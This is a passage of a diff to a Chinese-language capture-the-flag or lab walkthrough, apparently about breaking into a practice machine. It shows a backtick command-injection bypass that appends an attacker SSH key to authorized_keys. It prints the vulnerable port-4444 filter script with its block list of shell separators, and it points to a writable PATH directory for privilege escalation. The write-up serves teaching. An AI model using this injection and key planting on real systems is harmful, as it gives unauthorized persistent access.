@@ -49,6 +49,29 @@ echo `echo 'ssh-rsa ........1MdEG2btvfgk= kali@kali'>>./.ssh/authorized_keys`  #
 ssh -i id_rsa brad@192.168.5.40
 ```
 
+看看那个 4444 端口对应的脚本是怎么限制的，可以看到必须是以 id who echo clear 开头，并且没有限制反单引号，所以存在绕过：
+
+```shell
+items=(id who echo clear)
+signs=(";" "&" "&&" "|" "$")
+export TERM=xterm
+
+printf 'Type "?" for help.\n\n'
+
+while :
+do
+printf 'System command: '
+read -r cmd
+
+for y in "${signs[@]}"; do
+[[ $cmd =~ "$y" ]] && echo -e "${BOLDRED}Attack detected.${RESET}" && continue 2
+done
+
+for x in "${items[@]}"; do
+[[ $cmd =~ "$x" ]] && bash -c "$cmd"
+done
+```
+
 经过枚举，发现 /usr/local/bin 这个目录任意用户可以写入，并且这个目录是在系统环境变量 PATH 最开始位置。上传 pspy 发现后台有任务执行，/bin/bash /opt/check_VM
 
 ```
